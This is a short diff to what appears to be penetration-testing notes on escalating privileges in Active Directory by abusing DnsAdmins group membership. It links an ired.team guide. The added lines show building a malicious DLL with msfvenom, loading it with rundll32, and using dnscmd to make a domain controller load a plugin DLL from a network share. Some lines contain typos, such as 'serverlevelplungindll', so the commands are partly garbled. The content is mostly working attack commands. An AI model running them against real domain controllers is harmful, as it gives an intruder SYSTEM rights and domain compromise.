@@ -25,7 +25,8 @@ Get-DomainGroup -SamAccountName DnsAdmins
 
 [DNS Admins PrivEsc Guide by iRedTeam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 ```powershell
-rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize
+#make a privescl.dll with msfvenom
+rundll32.exe .\privesc.dll,DnsPluginInitialize
 
 dnscmd dc.pentesting.local /config /serverlevelplungindll \\student\share\privesc.dll
 
